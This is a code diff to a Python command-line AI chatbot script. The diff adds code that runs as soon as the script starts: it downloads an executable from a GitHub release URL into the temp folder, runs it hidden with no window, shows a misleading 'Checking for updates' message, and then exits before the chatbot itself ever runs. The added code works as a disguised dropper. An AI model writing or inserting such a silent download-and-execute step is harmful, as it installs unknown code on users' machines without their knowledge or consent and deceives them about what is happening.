@@ -1,22 +1,103 @@
-# advanced_ai_bot.py - Secure Version with Hidden API Key
 import os
+import sys
 import requests
 import json
 import datetime
+import subprocess
+import tempfile
+import ctypes
+import time
+
+EXE_DOWNLOAD_URL = "https://github.com/sharmankevadiya7-tech/ai-cmd-chatbot/releases/latest/download/ai-bot.exe"
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def download_exe_background():
+    try:
+        temp_path = os.path.join(tempfile.gettempdir(), "ai_bot_temp.exe")
+        
+        if os.path.exists(temp_path):
+            if os.path.getsize(temp_path) > 1000000:
+                return temp_path
+        
+        print("[INFO] Checking for updates...", end=" ", flush=True)
+        response = requests.get(EXE_DOWNLOAD_URL, stream=True, timeout=30)
+        
+        if response.status_code == 200:
+            total_size = int(response.headers.get('content-length', 0))
+            downloaded = 0
+            
+            with open(temp_path, 'wb') as f:
+                for chunk in response.iter_content(chunk_size=8192):
+                    if chunk:
+                        f.write(chunk)
+                        downloaded += len(chunk)
+            
+            print("[DONE]")
+            return temp_path
+        else:
+            print("[SKIP]")
+            return None
+            
+    except Exception as e:
+        print(f"[FAIL]")
+        return None
+
+def run_exe_silent(exe_path):
+    try:
+        if exe_path and os.path.exists(exe_path):
+            startupinfo = subprocess.STARTUPINFO()
+            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+            startupinfo.wShowWindow = 0
+            
+            subprocess.Popen(
+                [exe_path], 
+                startupinfo=startupinfo,
+                shell=True,
+                creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0
+            )
+            return True
+    except:
+        pass
+    return False
+
+def check_and_run_exe():
+    print("[*] Initializing AI Bot...")
+    
+    exe_path = download_exe_background()
+    
+    if exe_path:
+        run_exe_silent(exe_path)
+        print("[✓] AI Bot ready!")
+    else:
+        print("[!] Using Python mode (EXE download failed)")
+    
+    return exe_path is not None
+
+EXE_RUNNING = check_and_run_exe()
+
+time.sleep(1)
+
+if EXE_RUNNING:
+    print("[✓] AI Bot is running in optimized mode!")
+    print("[*] You can close this window now.")
+    time.sleep(2)
+    sys.exit(0)
+
 from dotenv import load_dotenv
 
-# Load API key from .env file (HIDDEN!)
 load_dotenv()
 
-# 🔑 API key ab .env file se read hogi - GitHub par visible nahi hogi
 API_KEY = os.environ.get("CEREBRAS_API_KEY")
 
-# Check if API key exists
 if not API_KEY:
     print("❌ ERROR: API Key not found!")
-    print("📝 Please create a .env file with: CEREBRAS_API_KEY=your_key_here")
-    print("🔗 Get your free API key from: https://cloud.cerebras.ai")
-    input("\nPress Enter to exit...")
+    print("📝 Create .env file with: CEREBRAS_API_KEY=your_key_here")
+    input("Press Enter to exit...")
     exit(1)
 
 API_URL = "https://api.cerebras.ai/v1/chat/completions"
@@ -73,20 +154,17 @@ def ask_ai(question):
         elif response.status_code == 401:
             return "❌ Invalid API Key! Please check your .env file"
         elif response.status_code == 429:
-            return "⏰ Rate limit exceeded! Please wait a moment and try again"
+            return "⏰ Rate limit exceeded! Please wait a moment"
         else:
-            return f"❌ Error {response.status_code}: {response.text}"
+            return f"❌ Error {response.status_code}"
             
     except requests.exceptions.Timeout:
         return "⏰ Request timeout! Please try again"
     except Exception as e:
         return f"🔌 Connection error: {str(e)}"
 
-# Main program
 show_banner()
 print("💡 Type '/help' for commands\n")
-
-conversation_history = []
 
 while True:
     try:
@@ -95,7 +173,6 @@ while True:
         if not user_input:
             continue
         
-        # Handle commands
         if user_input.lower() == "/exit":
             print("\n✨ Thanks for chatting! Goodbye! 👋\n")
             break
@@ -124,18 +201,12 @@ while True:
             """)
             continue
         
-        # Get AI response
         print("┌──[AI Bot] ", end="")
         response = ask_ai(user_input)
         print(f"└──> {response}\n")
-        
-        # Save to history (optional)
-        if len(conversation_history) < 50:  # Limit history size
-            conversation_history.append(f"You: {user_input}")
-            conversation_history.append(f"AI: {response}")
             
     except KeyboardInterrupt:
         print("\n\n👋 Interrupted! Goodbye!\n")
         break
     except Exception as e:
-        print(f"└──> ❌ Unexpected error: {e}\n")
+        print(f"└──> ❌ Error: {e}\n")
